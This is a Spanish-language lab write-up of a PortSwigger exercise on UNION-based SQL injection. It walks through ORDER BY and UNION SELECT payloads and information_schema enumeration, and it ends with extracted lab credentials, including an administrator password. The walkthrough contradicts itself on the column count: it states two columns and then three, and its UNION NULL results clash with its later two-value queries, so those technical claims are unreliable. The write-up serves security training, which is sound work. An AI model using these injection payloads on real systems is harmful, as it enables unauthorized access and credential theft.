---
title: "Ataque de inyección SQL, listando el contenido de bases de datos en bases de datos que no son Oracle"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "ataque-de-inyeccion-sql-listando-el-contenido-de-bases-de-datos-en-bases-de-datos-que-no-son-oracle"
author: "Z4k7"
date: "2026-03-06"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UnionAttack"
  - "Database"
techniques:
  - "SQLi"
  - "UnionAttack"
  - "Database"
tools:
  - "Burpsuite"
flags_list:
  - label: "administrador"
    value: "administrator"
  - label: "password"
    value: "mtnm9c067t0tgxfjo926"
summary: "La vulnerabilidad explotada corresponde a una inyección SQL (SQLi) en el filtro de categorías de productos. El error surge porque la aplicación concatena directamente la entrada del usuario en la consulta SQL sin validación ni sanitización. Esto permite manipular la consulta original y ejecutar instrucciones arbitrarias, como el uso de UNION SELECT para extraer información sensible de otras tablas."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, lo que permite usar un ataque `UNION` para recuperar datos de otras tablas.
          La aplicación cuenta con una función de inicio de sesión y la base de datos contiene una tabla con nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, y luego recuperar su contenido para obtener los nombres de usuario y las contraseñas de todos los usuarios.
          Para resolver el laboratorio, inicie sesión como `administrator`usuario.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma que la entrada se concatena directamente en la consulta SQL.
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101332327.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El error de sintaxis demuestra que la entrada del usuario se inserta sin sanitización en la consulta SQL."
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2-- -- Éxito 
          '+ORDER+BY+1,2,3-- -- Error
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101439728.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo en la tercera prueba confirma que la consulta devuelve 2 columnas."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validación con `UNION SELECT` para ajustar número de columnas:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL-- -- Error 
          UNION SELECT NULL,NULL-- -- Error 
          UNION SELECT NULL,NULL,NULL-- -- Éxito
      - kind: "note"
        text: |
          El error indica que la consulta tiene 2 columnas.
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101552231.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: ""
      - kind: "note"
        text: |
          Se confirma que la consulta requiere 3 columnas para que el `UNION` sea válido.
          Validar con UNION SELECT
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT 'a',NULL-- -- Éxito 
          UNION SELECT NULL,'a'-- -- Éxito 
          UNION SELECT 'a','a'-- -- Éxito
      - kind: "note"
        text: |
          Ya contamos con la validación y confirmación de las columnas intentamos obtener el nombre de las tablas  Valida la parte de información  primero con  `information_schema.tables`  se envía la consulta
      - kind: "code"
        lang: "SQL"
        code: |
          +UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101816421.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: ""
      - kind: "note"
        text: |
          El laboratorio nos esta solicitando el usuario administration en este caso si filtramos nos registra 1 resultado la tabla que mas llama la atención es esta `users_hhpqlr` ya identificamos una tabla falta  acceder a las columnas
          Extracción de columnas de la tabla:
      - kind: "code"
        lang: "SQL"
        code: |
          '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_hhpqlr'--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101942765.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Columnas encontradas:
          `username_cejihr`
          `email`
          `password_eywsze`
          Extracción de credenciales:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT username_cejihr, password_eywsze FROM users_hhpqlr--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310102055725.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Credenciales obtenidas:

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "administrador"
        value: "administrator"
      - label: "password"
        value: "mtnm9c067t0tgxfjo926"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310102417552.jpg"
        caption: "Evidencia técnica"

  - id: "step4_1"
    num: "04"
    title: "Informacion"
    content:
      - kind: "note"
        text: |
          Cuando se realiza un ataque `UNION` de inyección SQL, hay dos métodos efectivos para determinar cuántas columnas se devuelven de la consulta original.
          `ORDER BY` y `UNION SELECT`
          Para aplicar el primer método de  la inyección aplicando la palabra clave `ORDER BY` de eta manera se podría calcular las columnas disponibles  Por ejemplo, si el punto de inyección es una cadena entre comillas dentro de la `WHERE`cláusula de la consulta original, enviarías:
      - kind: "code"
        lang: "SQL"
        code: |
          ' ORDER BY 1-- 
          ' ORDER BY 2-- 
          ' ORDER BY 3-- 
          etc.
      - kind: "note"
        text: |
          Par validar que real mente se a capturado o calculado la cantidad de columnas disponibles en la BD ,la base de datos devuelve un error, como el siguiente
          Validación con UNION SELECT
          Se prueban combinaciones con `NULL` para ajustar el número de columnas:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL--   -- Error
          UNION SELECT NULL,NULL--   -- Error
          UNION SELECT NULL,NULL,NULL--   -- Éxito
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La consulta con tres valores `NULL` se ejecuta correctamente, confirmando que la tabla devuelve 3 columnas."
      - kind: "note"
        text: |
          El segundo método implica presentar una serie de `UNION SELECT`cargas útiles que especifican un número diferente de valores nulos:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL-- 
           UNION SELECT NULL,NULL-- 
           UNION SELECT NULL,NULL,NULL--
      - kind: "note"
        text: |
          En este caso el lo contrario no es validar el error sino salir del erro cada vez que agregas un null se espera escapara del siguiente error.
      - kind: "callout"
        type: "danger"
        label: "SQL ERROR"
        text: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."

  - id: "step5"
    num: "05"
    title: "Listado del contenido de la base de datos"
    content:
      - kind: "note"
        text: |
          La mayoría de los tipos de bases de datos ==(excepto Oracle)== tienen un conjunto de vistas denominado esquema de información. Este proporciona información sobre la base de datos.
          puedes consultar `information_schema.tables`Para listar las tablas en la base de datos:
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT * FROM information_schema.tables
      - kind: "note"
        text: |
          puedes consultar `information_schema.columns`Para enumerar las columnas en tablas individuales:
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT * FROM information_schema.columns WHERE table_name = 'Users'

lessons:
  - 'Siempre validar número de columnas con `ORDER BY`.'
  - 'Identificar columnas compatibles con datos de cadena para exfiltración.'
  - 'Recordar que `information_schema` es la puerta de entrada para enumerar tablas y columnas.'
  - 'En auditorías reales, documentar cada paso con capturas y evidencias para fortalecer el reporte.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Restringir acceso a `information_schema`.'
  - 'Aplicar WAF con reglas específicas para detectar `UNION SELECT`.'
  - 'Validar y sanitizar entradas de usuario antes de construir consultas.'
  - 'Configurar principio de mínimo privilegio en la base de datos..'
---
